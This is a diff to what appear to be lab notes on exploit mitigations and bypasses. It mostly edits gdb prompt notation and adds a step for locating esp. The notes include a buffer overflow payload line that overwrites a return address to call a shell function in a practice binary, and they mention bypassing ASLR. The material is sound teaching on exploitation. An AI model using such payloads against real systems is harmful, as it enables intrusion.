@@ -51,10 +51,10 @@ Exploit Mitigations and Bypasses
 			python ./pat_ind.py [hexdigits]
 		
 		Display functions in the program
-			gdb> info functions
+			(gdb) info functions
 		
 		Print the address of shell function
-			gdb> print shell
+			(gdb) print shell
 		
 		Print escaped attack code to call shell function
 			python -c 'print "A"*152 + r"\xfc\x85\x04\x08"'
@@ -70,7 +70,7 @@ Exploit Mitigations and Bypasses
 			gdb -p $(pgrep wisdom)
 		
 		Detach from gdb
-			gdb> detach
+			(gdb) detach
 	
 	Exercise 1: No mitigations, no shell function
 		There are a few differences from above.
@@ -82,7 +82,11 @@ Exploit Mitigations and Bypasses
 			./pat_gen.py 300
 			python ./pat_ind.py [hexdigits]
 		
-		
+		Find the location of esp
+			gdb-peda$ info registers esp
+			(shortcut: i r esp)
+			
+			python -c 'print "A"*152 + r"\xfc\x85\x04\x08"'
 		
 			
 	Bypass ASLR, no NX with Trampoline
